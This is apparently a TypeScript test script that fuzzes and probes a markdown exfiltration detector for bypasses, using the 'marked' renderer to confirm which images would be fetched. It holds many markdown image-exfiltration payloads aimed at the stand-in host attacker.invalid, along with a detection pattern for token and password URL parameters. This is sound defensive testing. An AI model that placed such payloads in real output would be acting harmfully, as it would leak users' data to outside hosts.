// T72 — independent attack on the T71 markdown bracket scanner.
//
// Three questions, none of them taken on report:
//   A. the SUPERSET claim: is there an input the OLD two patterns flagged that
//      the NEW scanner releases? Answered by a differential fuzz against a
//      reconstruction of the old markdown half, not by re-running T71's probe.
//   B. renderer-confirmed bypasses of the NEW scanner, with `marked` as oracle.
//   C. the released controls (four link spellings, reference-definition lines)
//      and the only bound (the standard's 999-character label).
//
// Read-only, offline, synthetic hosts only.
// Usage: bun T72-md.ts [out.json]
import { marked } from "marked";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "https://ok.example.org/x";

// ---------------------------------------------------------------------------
// A. reconstruction of the PRE-T71 markdown half.
//
// Reconstructed, and labelled as such: the pre-T71 tree is uncommitted and gone.
// The two patterns are taken verbatim from T66#F-002's finding text
// (`/(!?)\[[^\]]*\]\[([^\]]+)\]/g`) and from T71-spec 2 / T71-implementation 2,
// which quote `INLINE`'s description as `\[[^\]]*\]` and whose destination
// grammar survives verbatim as the new `INLINE_DESTINATION` body.
const OLD_INLINE = /(!?)\[[^\]]*\]\(\s*(?:<([^<>\n]*)>|([^)\s]+))[^)]*\)/g;
const OLD_REFERENCE_USE = /(!?)\[[^\]]*\]\[([^\]]+)\]/g;
const REFERENCE_DEF = /^[ \t]*\[([^\]]+)\]:\s*(?:<([^<>\n]*)>|(\S+))/gm;
const SENSITIVE_URL_VALUE =
  /(?:[?&](?:api[_-]?key|access[_-]?token|auth[_-]?token|token|password|secret)=|\/(?:api[_-]?key|access[_-]?token|auth[_-]?token|token|password|secret)\/)[^&#/?\s]+/i;

type Span = { policyId: string; start: number; end: number; url: string };

function external(url: string): boolean {
  // the same question `considerUrl` asks, reduced to what the fuzz needs
  return url.includes(ATT) || url.includes("ok.example.org") || url.includes("cdn.example.org");
}

function oldMarkdownSpans(content: string): Span[] {
  const out: Span[] = [];
  const refs = new Map<string, { url: string; start: number }>();
  REFERENCE_DEF.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = REFERENCE_DEF.exec(content)) !== null) {
    const ref = (m[1] ?? "").trim().toLowerCase();
    const url = m[2] ?? m[3] ?? "";
    if (ref && url) refs.set(ref, { url, start: m.index + m[0].lastIndexOf(url) });
  }
  OLD_INLINE.lastIndex = 0;
  while ((m = OLD_INLINE.exec(content)) !== null) {
    const isImage = m[1] === "!";
    const url = m[2] ?? m[3] ?? "";
    if (!url) continue;
    if (!isImage && !SENSITIVE_URL_VALUE.test(url)) continue;
    if (!external(url)) continue;
    const start = m.index + m[0].lastIndexOf(url);
    out.push({
      policyId: isImage ? "egress.markdown-image-exfil" : "egress.markdown-link-sensitive-value",
      start,
      end: start + url.length,
      url,
    });
  }
  OLD_REFERENCE_USE.lastIndex = 0;
  while ((m = OLD_REFERENCE_USE.exec(content)) !== null) {
    if (m[1] !== "!") continue;
    const def = refs.get((m[2] ?? "").trim().toLowerCase());
    if (!def) continue;
    if (!external(def.url)) continue;
    out.push({
      policyId: "egress.reference-link-exfil",
      start: def.start,
      end: def.start + def.url.length,
      url: def.url,
    });
  }
  return out;
}

function newMarkdownSpans(content: string): Span[] {
  return detectExfil(content, [])
    .filter((f) => f.policyId.startsWith("egress.markdown") || f.policyId === "egress.reference-link-exfil")
    .map((f) => ({ policyId: f.policyId, start: f.start, end: f.end, url: String(f.value) }));
}

const key = (s: Span) => `${s.policyId}@${s.start}-${s.end}`;

// deterministic PRNG so the fuzz is reproducible
let seed = 0x5eed72;
function rnd(n: number): number {
  seed = (seed * 1103515245 + 12345) & 0x7fffffff;
  return seed % n;
}

const ALPHABET = ["[", "]", "(", ")", "!", "a", " ", "\n", U, ":", "<", ">"];
const FUZZ_ITERATIONS = 120000;
const supersetViolations: { input: string; missing: string[] }[] = [];
const widened: number[] = [];
for (let i = 0; i < FUZZ_ITERATIONS; i += 1) {
  const length = 4 + rnd(11);
  let text = "";
  for (let t = 0; t < length; t += 1) text += ALPHABET[rnd(ALPHABET.length)] as string;
  if (rnd(3) === 0) text += `\n\n[a]: ${U}\n`;
  let oldSpans: Span[];
  let newSpans: Span[];
  try {
    oldSpans = oldMarkdownSpans(text);
    newSpans = newMarkdownSpans(text);
  } catch {
    continue;
  }
  const newKeys = new Set(newSpans.map(key));
  const missing = oldSpans.map(key).filter((k) => !newKeys.has(k));
  if (missing.length > 0 && supersetViolations.length < 40) {
    supersetViolations.push({ input: text, missing: [...new Set(missing)] });
  } else if (missing.length > 0) {
    widened.push(i);
  }
}

// ---------------------------------------------------------------------------
// B + C. named shapes, with `marked` as the renderer oracle.
const longLabel = "L".repeat(1200);
const cases: Record<string, string> = {
  // --- the shapes T71 closed (controls that must stay flagged) ---
  ctlInline: `![a](${U})`,
  ctlFullRef: `![a][a]\n\n[a]: ${U}\n`,
  ctlCollapsedRef: `![a][]\n\n[a]: ${U}\n`,
  ctlShortcutRef: `![a]\n\n[a]: ${U}\n`,
  ctlNestedBrackets: `![a[b]c](${U})`,
  ctlDepth3: `![a[b[c[d]e]f]g](${U})`,

  // --- A: an image nested inside a LINK (the README badge shape) ---
  linkedInlineImage: `[![badge](${U})](https://example.com/repo)`,
  linkedInlineImageNoBang: `[![badge](${U})](${OK})`,
  linkedShortcutImage: `[![badge]](https://example.com/repo)\n\n[badge]: ${U}\n`,
  linkedFullRefImage: `[![badge][b]](https://example.com/repo)\n\n[b]: ${U}\n`,
  linkedInlineImageProse: `Build status: [![build](${U})](https://ci.example.com/job) — green.`,

  // --- an inline image inside an IMAGE description ---
  imageInsideImage: `![a[b](${U})](${OK})`,

  // --- the 999-char label bound ---
  longLabelFullRef: `![a][${longLabel}]\n\n[${longLabel}]: ${U}\n`,
  longLabelShortcut: `![${longLabel}]\n\n[${longLabel}]: ${U}\n`,
  labelAt999FullRef: `![a][${"L".repeat(999)}]\n\n[${"L".repeat(999)}]: ${U}\n`,

  // --- C: released controls ---
  ctlLinkInline: `[text](${U})`,
  ctlLinkFull: `[text][a]\n\n[a]: ${U}\n`,
  ctlLinkCollapsed: `[text][]\n\n[text]: ${U}\n`,
  ctlLinkShortcut: `[text]\n\n[text]: ${U}\n`,
  ctlRefDefAloneNoUse: `[a]: ${U}\n\nNothing uses it.\n`,
  ctlRelativeImage: `![a](/assets/logo.png)`,
};

type Row = {
  id: string;
  rendererFetches: boolean;
  imgSrcs: string[];
  findings: number;
  policyIds: string[];
  maskedStillLeaksHost: boolean;
  verdict: "flagged" | "partial" | "released";
};

const rows: Row[] = [];
for (const [id, text] of Object.entries(cases)) {
  const html = String(await marked.parse(text, { async: true }));
  const imgSrcs = [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/gi)].map((mm) => mm[1] ?? "");
  const findings = detectExfil(text, []);
  const redacted = applyRedaction(text, findings) as unknown;
  const masked =
    typeof redacted === "string"
      ? redacted
      : ((redacted as { text?: string }).text ?? String(redacted));
  rows.push({
    id,
    rendererFetches: imgSrcs.some((s) => s.includes(ATT)),
    imgSrcs,
    findings: findings.length,
    policyIds: [...new Set(findings.map((f) => f.policyId))],
    maskedStillLeaksHost: masked.includes(ATT),
    verdict:
      findings.length === 0 ? "released" : masked.includes(ATT) ? "partial" : "flagged",
  });
}

for (const r of rows) {
  console.log(
    `${r.id.padEnd(24)} rendererFetchesAttacker=${String(r.rendererFetches).padEnd(5)} detector=${r.verdict.padEnd(8)} ids=${JSON.stringify(r.policyIds)} imgSrcs=${JSON.stringify(r.imgSrcs)}`,
  );
}

const bypasses = rows.filter((r) => r.rendererFetches && r.verdict !== "flagged").map((r) => r.id);
const falsePositives = rows
  .filter((r) => !r.rendererFetches && r.verdict !== "released" && r.id.startsWith("ctlLink"))
  .map((r) => r.id);

const summary = {
  fuzzIterations: FUZZ_ITERATIONS,
  supersetViolations: supersetViolations.length + widened.length,
  supersetViolationSamples: supersetViolations.slice(0, 12),
  namedCases: rows.length,
  rendererConfirmedBypasses: bypasses,
  clickGatedControlsFlagged: falsePositives,
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, rows, supersetViolations }, null, 2));
